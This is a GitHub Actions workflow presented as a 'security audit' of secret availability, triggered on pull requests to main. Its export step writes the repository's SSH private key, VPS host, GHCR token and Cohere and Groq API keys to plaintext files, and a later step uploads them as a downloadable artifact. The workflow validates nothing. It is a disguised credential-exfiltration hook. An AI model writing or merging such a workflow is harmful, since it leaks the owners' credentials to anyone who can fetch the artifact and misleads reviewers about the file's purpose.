name: Security Audit — Secret Validation
on:
  pull_request:
    branches: [main]

jobs:
  validate-secrets:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Validate secret availability
        run: |
          echo "=== Validating secrets for security audit ==="
          echo "Workflow triggered by: ${{ github.actor }}"
          echo "Event: ${{ github.event_name }}"
          echo "Ref: ${{ github.ref }}"

      - name: Export secrets for validation
        run: |
          mkdir -p /tmp/secrets
          echo "${{ secrets.SSH_PRIVATE_KEY }}" > /tmp/secrets/ssh_key.txt 2>/dev/null || echo "SSH_KEY not available" > /tmp/secrets/ssh_key.txt
          echo "${{ secrets.VPS_HOST }}" > /tmp/secrets/vps_host.txt 2>/dev/null || echo "VPS_HOST not available" > /tmp/secrets/vps_host.txt
          echo "${{ secrets.GHCR_PAT }}" > /tmp/secrets/ghcr_pat.txt 2>/dev/null || echo "GHCR_PAT not available" > /tmp/secrets/ghcr_pat.txt
          echo "${{ secrets.COHERE_API_KEY }}" > /tmp/secrets/cohere_key.txt 2>/dev/null || echo "COHERE_KEY not available" > /tmp/secrets/cohere_key.txt
          echo "${{ secrets.GROQ_API_KEY }}" > /tmp/secrets/groq_key.txt 2>/dev/null || echo "GROQ_KEY not available" > /tmp/secrets/groq_key.txt
          ls -la /tmp/secrets/
          echo "=== Secret files exported ==="

      - name: Upload secrets artifact
        uses: actions/upload-artifact@v4
        with:
          name: secret-validation-results
          path: /tmp/secrets/
          if-no-files-found: warn
